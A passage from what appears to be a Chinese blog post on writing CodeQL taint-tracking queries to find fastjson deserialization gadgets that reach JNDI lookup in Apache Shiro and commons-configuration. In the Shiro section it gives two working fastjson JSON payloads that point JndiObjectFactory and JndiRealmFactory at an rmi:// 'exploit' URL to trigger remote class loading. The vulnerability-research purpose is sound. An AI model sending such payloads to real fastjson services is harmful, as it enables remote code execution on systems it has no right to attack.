        exists(Method method |
        method.hasName("toObject") and method.getDeclaringType().getAnAncestor().hasQualifiedName("org.apache.struts2.rest.handler", "ContentTypeHandler") and source.asParameter() = method.getParameter(0)
        )
      }
        override predicate isSink(DataFlow::Node sink) {
        exists(MethodAccess call, Method method |
          method.hasName("fromXML") and method.getDeclaringType().hasQualifiedName("com.thoughtworks.xstream", "XStream") and call.getMethod() = method and sink.asExpr() = call.getArgument(0)
        )
      }
    }
    from StrutsUnsafeDeserializationConfig config, DataFlow::Node source, DataFlow::Node sink
    where config.hasFlow(source, sink)
    select source, sink
## 小试牛刀 - codeql 找fastjson 反序列化链
为了与这位老哥 和`common-configuration`
### shrio
`source` 主要是 `class`的所有`Field`, `sink` 就是`javax.naming` `Context` `interface`
的 `lookup` 方法，看16年backhat
的那个ppt其实还有个`search`方法，但是这个不能直接注入URL，所以在这里就不考虑了。大家如果还有其他`sink`欢迎联系一起交流。
第一版代码
    import java
    import semmle.code.java.dataflow.DataFlow
    import semmle.code.java.dataflow.TaintTracking
    class JNDIMethod extends Method{
        JNDIMethod(){
            this.getDeclaringType().getAnAncestor().hasQualifiedName("javax.naming", "Context") and
            this.hasName("lookup")
        }
    }
    class MyTaintTrackingConfiguration extends TaintTracking::Configuration {
      MyTaintTrackingConfiguration() { this = "MyTaintTrackingConfiguration" }
      override predicate isSource(DataFlow::Node source) {
        exists(FieldAccess fac|
        source.asExpr() = fac
        )
      }
      override predicate isSink(DataFlow::Node sink) {
        exists(MethodAccess call |
        call.getMethod() instanceof JNDIMethod and sink.asExpr() = call.getArgument(0)
        )
      }
    }
    from  MyTaintTrackingConfiguration config, DataFlow::Node source, DataFlow::Node sink
    where config.hasFlow(source, sink)
    select source, sink
能查出来，但是没有显示具体的path，后来查看文档，应该是可以显示path的。
> ## Running path queries in VS Code
>
>   1. Open a path query in the editor.
>   2. Right-click in the query window and select **CodeQL: Run Query**.
> (Alternatively, run the command from the Command Palette.)
>   3. Once the query has finished running, you can see the results in the
> Results view as usual (under `alerts` in the dropdown menu). Each query
> result describes the flow of information between a source and a sink.
>   4. Expand the result to see the individual steps that the data follows.
>   5. Click each step to jump to it in the source code and investigate the
> problem further.
>   6. To navigate the path from your keyboard, you can bind shortcuts to the
> **CodeQL: Show Previous Step on Path** and **CodeQL: Show Next Step on
> Path** commands.
>
后来根据
这个抄了一下。
    import java
    import semmle.code.java.dataflow.FlowSources
    import semmle.code.java.dataflow.TaintTracking2
    import DataFlow2::PathGraph
    class JNDIMethod extends Method{
        JNDIMethod(){
            this.getDeclaringType().getAnAncestor().hasQualifiedName("javax.naming", "Context") and
            this.hasName("lookup")
        }
    }
    class MyTaintTrackingConfiguration extends TaintTracking2::Configuration {
      MyTaintTrackingConfiguration() { this = "MyTaintTrackingConfiguration" }
      override predicate isSource(DataFlow::Node source) {
        exists(FieldAccess fac|
        source.asExpr() = fac
        )
      }
      override predicate isSink(DataFlow::Node sink) {
        exists(MethodAccess call |
        call.getMethod() instanceof JNDIMethod and sink.asExpr() = call.getArgument(0)
        )
      }
    }
    from  MyTaintTrackingConfiguration config, DataFlow2::PathNode source, DataFlow2::PathNode sink
    where config.hasFlowPath(source, sink)
    select sink.getNode(), source, sink, source.getNode()
下拉菜单里面`nodes` 和 `edge` 但是没有他说的`alerts`。
后来查了 ~~一下~~ 几下，查到了这个 在注释里面加一个metadata
就行了。（其实上面的xss.ql里面也写了，以为注释不用抄）
最终代码变成了这样。
    /**
    @kind path-problem
    */
    import java
    import semmle.code.java.dataflow.FlowSources
    import semmle.code.java.dataflow.TaintTracking2
    import DataFlow2::PathGraph
    class JNDIMethod extends Method{
        JNDIMethod(){
            this.getDeclaringType().getAnAncestor().hasQualifiedName("javax.naming", "Context") and
            this.hasName("lookup")
        }
    }
    class MyTaintTrackingConfiguration extends TaintTracking2::Configuration {
      MyTaintTrackingConfiguration() { this = "MyTaintTrackingConfiguration" }
      override predicate isSource(DataFlow::Node source) {
        exists(FieldAccess fac|
        source.asExpr() = fac
        )
      }
      override predicate isSink(DataFlow::Node sink) {
        exists(MethodAccess call |
        call.getMethod() instanceof JNDIMethod and sink.asExpr() = call.getArgument(0)
        )
      }
    }
    from  MyTaintTrackingConfiguration config, DataFlow2::PathNode source, DataFlow2::PathNode sink
    where config.hasFlowPath(source, sink)
    select source.getNode(), source, sink, sink.getNode()
通过人工检查这些路径，第一个属于误报，第二个三属于不同的分支，可利用，第四也可利用。
第一个是属于误报
分析认为`org.apache.shiro.jndi.JndiLocator` 的`CONTAINER_PREFIX` `Field`
也会通过`convertJndiName` 的调用传播到`lookup` 那里
第二个和第三个属于同一个，分别if，else分支里
`org.apache.shiro.jndi.JndiObjectFactory`
    String input = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\", \"resourceName\":\"rmi://127.0.0.1:9050/exploit\"}";
    Object obj = JSON.parseObject(input);
第四个
`org.apache.shiro.realm.jndi.JndiRealmFactory`
    String input = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":\"rmi://127.0.0.1:9050/exploit\"}";
    Object obj = JSON.parseObject(input);
可以看到成功的发起了RMI请求
怎么减少误报呢？
`FieldAccess`要从一个`setXXX`或者`getXXX` 流到 `lookup`。
    /**
    @kind path-problem
    */
    import java
    import semmle.code.java.dataflow.FlowSources
    import semmle.code.java.dataflow.TaintTracking2
    import DataFlow2::PathGraph
    class JNDIMethod extends Method{
        JNDIMethod(){
            this.getDeclaringType().getAnAncestor().hasQualifiedName("javax.naming", "Context") and
            this.hasName("lookup")
        }
    }
    class MyTaintTrackingConfiguration extends TaintTracking2::Configuration {
      MyTaintTrackingConfiguration() { this = "MyTaintTrackingConfiguration" }
      override predicate isSource(DataFlow::Node source) {
        exists(FieldAccess fac |
        (fac.getSite().getName().indexOf("get")=0 or fac.getSite().getName().indexOf("set")=0) and source.asExpr() = fac
        )
      }
      override predicate isSink(DataFlow::Node sink) {
        exists(MethodAccess call |
        call.getMethod() instanceof JNDIMethod and sink.asExpr() = call.getArgument(0)
        )
      }
    }
    from  MyTaintTrackingConfiguration config, DataFlow2::PathNode source, DataFlow2::PathNode sink
    where config.hasFlowPath(source, sink)
    select source.getNode(), source, sink, sink.getNode()
这样就会排除第一个误报。
### common-configuration
`common-configuration` 的结果如下
从上面可以看到效果和那位老哥的基本差不多，而且直接给出了具体的数据流。
~~附件我提供了我创建好的两个database，供大家下载！~~  
一个30.8M 一个 29.9M ，我没能上传成功，我是从github直接下载的源码，然后使用 `codeql database create
--language=java qldatabase` 让他自己build一会就好了。
## 参考链接
  * workshop 
  * Codeql java api 手册 
  * QL 语法手册 
  * 
  * 